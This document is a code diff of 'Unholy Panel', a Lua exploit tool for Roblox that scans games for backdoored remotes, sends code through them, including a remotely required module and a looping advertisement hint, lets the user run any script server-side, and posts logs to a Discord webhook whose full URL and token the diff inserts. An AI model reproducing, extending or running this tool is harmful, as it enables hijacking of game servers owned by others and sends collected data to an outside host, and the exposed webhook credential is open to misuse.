@@ -426,7 +426,7 @@ local script = G2L["4"];
 			remotes[code]=remote
 	
 			if self:IsSuspiciousRemote(remote.Name) then
-				self:Debug('Sended Backdoor to SUSPICIOUS \"'..remote:GetFullName()..'\"', 3)
+				self:Debug('Sended Backdoor to sus remote \"'..remote:GetFullName()..'\"', 3)
 			else
 				self:Debug('Sended Backdoor \"'..remote:GetFullName()..'\"', 1)
 			end
@@ -444,16 +444,15 @@ local script = G2L["4"];
 					self:Debug(remote:GetFullName(), 3)
 	
 					if self:IsSuspiciousRemote(remote.Name) then
-						self:Notify('Using SUSPICIOUS remote: '..remote.Name)
-						self:Debug('Backdoor is SUSPICIOUS: '..remote.Name, 3)
+						self:Notify('Using sus remote: '..remote.Name)
 					end
 	
 					self:RunRemote(remote, "require(171016405.1884*69)")			
-					self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Unholy Panel | Free Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Unholy Panel | Free Backdoor Scanner | .gg/5SRvpmPJ 'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 	
 					if Exploit.Request and not _G.UnholyPanel_Logs_Disabled then 
 						Exploit.Request({
-							Url = 'https://discord.com/api/webhooks/INSERT_WEBHOOK_HERE',
+							Url = 'https://discord.com/api/webhooks/1479699998793924680/pfRoqE5d-uZQJZjgw_OJsaOZsfrq98UsRjivoRYpsZJh0fFAf5kB5GLbkbwi7Wn38zPb',
 							Method = 'POST',
 							Headers = {
 								['Content-Type'] = 'application/json',
@@ -484,25 +483,25 @@ local script = G2L["4"];
 	
 		if not UnholyPanel:FindRemote() then
 			AttachBtn.Text='No backdoor :('
-			UnholyPanel:Notify('No backdoor found!')
+			UnholyPanel:Notify('No backdoor found')
 		else
-			AttachBtn.Text='Attached!'
-			UnholyPanel:Notify('Backdoor attached successfully!')
+			AttachBtn.Text='Attached'
+			task.wait(10)
+			AttachBtn.Text='Attach'
 		end
 	
 		UnholyPanel.isScanning = false
 	end)
 	
-	-- GUI Button Event: Execute
 	ExecuteBtn.MouseButton1Click:Connect(function()
 		if UnholyPanel.backdoor == nil then
-			UnholyPanel:Notify('No backdoor attached! Click Attach first.')
+			UnholyPanel:Notify('No backdoor attached Click Attach first.')
 			return
 		end
 	
 		local code = ScriptBox.Text
 		if code == '' then
-			UnholyPanel:Notify('Script box is empty!')
+			UnholyPanel:Notify('Script box is empty')
 			return
 		end
 	
